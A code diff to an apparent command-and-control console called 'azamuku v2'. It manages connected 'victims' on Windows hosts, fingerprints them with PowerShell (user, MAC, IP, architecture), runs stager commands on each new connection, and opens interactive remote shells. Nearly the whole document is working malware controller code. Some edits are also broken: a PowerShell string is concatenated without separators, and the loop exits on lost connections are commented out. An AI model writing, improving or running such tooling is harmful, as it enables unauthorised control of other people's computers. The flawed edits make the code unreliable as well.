@@ -32,62 +32,93 @@ def getInfo():
     old = 0
 
     while True:
+        # If the connects list shrank, sync the old counter and continue
         if len(s.connects) < old:
             old = len(s.connects)
             continue
 
+        # If new connections were appended, process each one (not just the last)
         if len(s.connects) > old:
-            newUID = s.connects[-1]
-            control = s.client(newUID)
+            # process all newly appended UIDs
+            for i in range(old, len(s.connects)):
+                newUID = s.connects[i]
+                control = s.client(newUID)
 
-            if args.strict == False:
-                mac_cmd = (
-                    "$m = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' -and "
-                    "$_.InterfaceDescription -notmatch 'Virtual|Loopback|Tunnel|WAN Miniport|Bluetooth|Hyper-V' } | "
-                    "Sort-Object -Property Speed -Descending | Select-Object -First 1).MacAddress; "
-                    "if ($m) { $m.Replace('-',':') } else { "
-                    "$m2 = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' } | "
-                    "Select-Object -First 1).MacAddress; "
-                    "if ($m2) { $m2.Replace('-',':') } else { 'unknown' } }"
-                )
-                s.vicInfo[newUID] = {
-                    "hostname": control.run("whoami"),
-                    "mac": control.run(mac_cmd).strip(),
-                    "ip": s.client_ips.get(newUID, "unknown"),
-                    "arch": "x86" if control.run("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64",
-                }
-            else:
-                s.vicInfo[newUID] = {
-                    "hostname": "strict mode active",
-                    "mac": "strict mode active",
-                    "ip": "strict mode active",
-                    "arch": "strict mode active"
-                }
-
-            if stager == None:
-                pass
-            else:
+                # Gather victim info. Catch KeyboardInterrupt separately so a Ctrl+C
+                # during a long-running RPC doesn't kill the whole program.
                 try:
-                    for x in open(stager, "r").read().split("\n"):
-                        control.run(x)
+                    if args.strict == False:
+                        mac_cmd = (
+                            "$m = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' -and "
+                            "$_.InterfaceDescription -notmatch 'Virtual|Loopback|Tunnel|WAN Miniport|Bluetooth|Hyper-V' } | "
+                            "Sort-Object -Property Speed -Descending | Select-Object -First 1).MacAddress; "
+                            "if ($m) { $m.Replace('-',':') } else { "
+                            "$m2 = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' } | "
+                            "Select-Object -First 1).MacAddress; "
+                            "if ($m2) { $m2.Replace('-',':') } else { 'unknown' } }"
+                            'Get-NetAdapter -Name "Wi-Fi" | Select-Object MacAddress'
+                            'Get-NetAdapter -Name "Ethernet" | Select-Object MacAddress'
+                        )
+                        hostname = control.run("whoami")
+                        mac = control.run(mac_cmd).strip()
+                        ip = s.client_ips.get(newUID, "unknown")
+                        arch = "x86" if control.run("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64"
+                        s.vicInfo[newUID] = {
+                            "hostname": hostname,
+                            "mac": mac,
+                            "ip": ip,
+                            "arch": arch,
+                        }
+                    else:
+                        s.vicInfo[newUID] = {
+                            "hostname": "strict mode active",
+                            "mac": "strict mode active",
+                            "ip": "strict mode active",
+                            "arch": "strict mode active"
+                        }
+                except KeyboardInterrupt:
+                    # User hit Ctrl+C while waiting on a remote call; don't exit.
+                    s.vicInfo[newUID] = {
+                        "hostname": s.client_ips.get(newUID, "unknown"),
+                        "mac": "unknown",
+                        "ip": s.client_ips.get(newUID, "unknown"),
+                        "arch": "unknown",
+                    }
                 except Exception as e:
-                    print("\n[+] failed to run stager on uid '{}' - '{}'".format(x, e))
+                    print(f"\n[!] failed to gather info for uid '{newUID}' - '{e}'")
+                    s.vicInfo[newUID] = {
+                        "hostname": "unknown",
+                        "mac": "unknown",
+                        "ip": s.client_ips.get(newUID, "unknown"),
+                        "arch": "unknown",
+                    }
 
-            # Notify user of new connection (unless it was added via allow/grab)
-            if newUID not in silent_uids:
-                try:
-                    ip_addr = s.vicInfo[newUID]['ip']
-                    hostname = s.vicInfo[newUID]['hostname']
-                    print(f"\n\n[!] New victim connected: {newUID} ({hostname} @ {ip_addr})\n")
-                    print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
-                except:
-                    pass
-            else:
-                # Remove from silent_uids so we don't suppress future reconnections
-                silent_uids.discard(newUID)
+                if stager is not None:
+                    try:
+                        for x in open(stager, "r").read().split("\n"):
+                            try:
+                                control.run(x)
+                            except KeyboardInterrupt:
+                                print("\n[+] stager run interrupted by user")
+                                break
+                    except Exception as e:
+                        print("\n[+] failed to run stager on uid '{}' - '{}'".format(x, e))
 
-            if newest == False:
-                newest = newUID
+                # Notify user of new connection (unless it was added via allow/grab)
+                if newUID not in silent_uids:
+                    try:
+                        ip_addr = s.vicInfo[newUID]['ip']
+                        hostname = s.vicInfo[newUID]['hostname']
+                        print(f"\n\n[!] New victim connected: {newUID} ({hostname} @ {ip_addr})\n")
+                        print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
+                    except:
+                        pass
+                else:
+                    # Remove from silent_uids so we don't suppress future reconnections
+                    silent_uids.discard(newUID)
+
+                if newest == False:
+                    newest = newUID
 
             old = len(s.connects)
 
@@ -182,10 +213,14 @@ def interactive(uid):
         print(f"\n[X] Failed to start shell: {e}")
         return
 
+    except KeyboardInterrupt:
+        print('\n[+] interrupted while starting shell (Ctrl+C)')
+        return
+
     while True:
         if uid not in s.connects:
             print(f"\n[X] Connection lost to {uid} - returning to menu")
-            break
+            # break
 
         try:
             command = input(pwd)
@@ -199,7 +234,7 @@ def interactive(uid):
                     continue
                 except ConnectionError:
                     print(f"\n[X] Connection lost to {uid} - returning to menu")
-                    break
+                    # break
                 except Exception as e:
                     print(f"[!] Error updating pwd: {e}")
                     pass
@@ -217,7 +252,7 @@ def interactive(uid):
             print("\n[+] command interrupted")
         except ConnectionError:
             print(f"\n[X] Connection lost to {uid} - returning to menu")
-            break
+            # break
         except Exception as e:
             print(f"[!] Error running command: {e}")
 
@@ -501,7 +536,7 @@ if __name__ == '__main__':
 
             elif cmd.lower() == "info":
                 if len(list(s.vicInfo)) == 0:
-                    print("no victims")
+                    print("no victims found\n")
                     continue
                 else:
                     first = list(s.vicInfo)[0] # is a uid
@@ -605,7 +640,6 @@ if __name__ == '__main__':
                         for x in uids:
                             s.authorized.append(x)
                             silent_uids.add(x)  # Mark as silent to suppress future notifications
-                            getInfo()  # Refresh victim info to show newly allowed UIDs
                         print("[+] allowed {} uids to connect back, from file '{}'".format(len(uids), cArgs))
 
                 except:
@@ -620,7 +654,7 @@ if __name__ == '__main__':
                     print("[+] this allows *unauthenticated* payloads to be re-authenticated - be careful")
                     s.enableGrab = True
                     print("[+] enabled grabbing old sessions - toggle this by running 'grab' again")
-                    getInfo()  # Refresh victim info to show any newly grabbed UIDs
+                    # background thread will pick up any newly grabbed UIDs
                 else:
                     s.enableGrab = False
                     print("[+] disabled grabbing")
